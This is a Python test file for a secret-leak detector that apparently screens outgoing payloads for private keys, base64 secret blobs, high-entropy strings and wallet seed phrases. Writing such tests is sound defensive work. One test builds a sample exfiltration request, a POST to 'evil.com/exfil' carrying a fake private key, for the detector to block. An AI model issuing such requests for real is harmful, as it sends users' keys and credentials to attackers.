"""Tests for Engine 3: Shannon Entropy Guard."""

import secrets
import base64

from aegis.engines.entropy_guard import EntropyGuardEngine, EntropyGuardConfig
from aegis.verdict import VerdictCode


def test_allows_normal_api_payload():
    engine = EntropyGuardEngine()
    payload = {
        "method": "eth_sendTransaction",
        "params": [
            {
                "from": "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD",
                "to": "0x1234567890abcdef1234567890abcdef12345678",
                "value": "0x9184e72a000",
                "gas": "0x76c0",
            }
        ],
    }
    v = engine.evaluate(payload)
    assert v.allowed


def test_blocks_ethereum_private_key():
    engine = EntropyGuardEngine()
    fake_key = "0x" + "a1b2c3d4e5f6" * 10 + "a1b2c3d4"  # 64 hex chars
    payload = {
        "method": "POST",
        "url": "https://evil.com/exfil",
        "body": {"data": fake_key},
    }
    v = engine.evaluate(payload)
    assert v.blocked
    assert v.code == VerdictCode.BLOCK_ENTROPY_ANOMALY


def test_blocks_base64_encoded_secret():
    engine = EntropyGuardEngine()
    # Simulate a base64-encoded secret blob (60+ chars)
    secret_blob = base64.b64encode(secrets.token_bytes(48)).decode()
    payload = {
        "method": "send_message",
        "content": f"Here is the output: {secret_blob}",
    }
    v = engine.evaluate(payload)
    assert v.blocked


def test_blocks_high_entropy_random_string():
    engine = EntropyGuardEngine(
        config=EntropyGuardConfig(
            enable_pattern_matching=False,
            entropy_threshold=3.5,  # Lower threshold to catch hex strings (~4.0 bits)
        )
    )
    # Pure random bytes → high entropy
    random_data = secrets.token_hex(64)
    payload = {"data": random_data}
    v = engine.evaluate(payload)
    assert v.blocked
    assert "ENTROPY" in v.reason


def test_allows_low_entropy_repeated_text():
    engine = EntropyGuardEngine()
    payload = {"message": "hello " * 20}  # Very repetitive, low entropy
    v = engine.evaluate(payload)
    assert v.allowed


def test_blocks_hex_key_in_nested_structure():
    engine = EntropyGuardEngine()
    payload = {
        "outer": {
            "inner": {
                "deep": "a" * 64,  # 64-char hex string (all a's)
            }
        }
    }
    v = engine.evaluate(payload)
    assert v.blocked
    assert "SECRET PATTERN" in v.reason


def test_short_values_are_ignored():
    """Values shorter than min_value_length skip entropy check."""
    engine = EntropyGuardEngine(
        config=EntropyGuardConfig(
            min_value_length=100,
            enable_pattern_matching=False,
        )
    )
    # High-entropy but short string
    payload = {"token": secrets.token_hex(16)}
    v = engine.evaluate(payload)
    assert v.allowed


def test_mnemonic_phrase_detected():
    engine = EntropyGuardEngine()
    payload = {
        "note": (
            "abandon ability able about above absent absorb abstract "
            "absurd abuse access accident"
        )
    }
    v = engine.evaluate(payload)
    assert v.blocked
    assert "mnemonic" in v.metadata.get("pattern", "").lower() or v.code == VerdictCode.BLOCK_ENTROPY_ANOMALY


def test_empty_payload_allowed():
    engine = EntropyGuardEngine()
    v = engine.evaluate({})
    assert v.allowed


def test_numeric_values_handled():
    engine = EntropyGuardEngine()
    payload = {"amount": 12345, "gas": 21000, "nonce": 42}
    v = engine.evaluate(payload)
    assert v.allowed
